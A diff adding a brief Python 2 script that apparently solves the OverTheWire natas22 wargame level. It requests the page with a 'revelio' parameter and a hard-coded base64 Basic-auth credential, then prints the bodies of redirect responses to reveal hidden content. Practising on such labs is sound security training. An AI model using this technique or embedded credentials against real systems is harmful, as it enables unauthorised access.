@@ -1,0 +1,25 @@
+import requests
+
+url = "http://natas22.natas.labs.overthewire.org/"
+
+params = {
+	"revelio": "1"
+}
+
+headers = {
+	"Authorization": "Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg=="
+}
+
+r = requests.get(url, params=params, headers=headers)
+
+print r.history
+
+for h in r.history:
+	print h.headers
+	print h.content
+
+print "[r.headers]"
+print r.headers
+
+print "[r.content]"
+print r.content
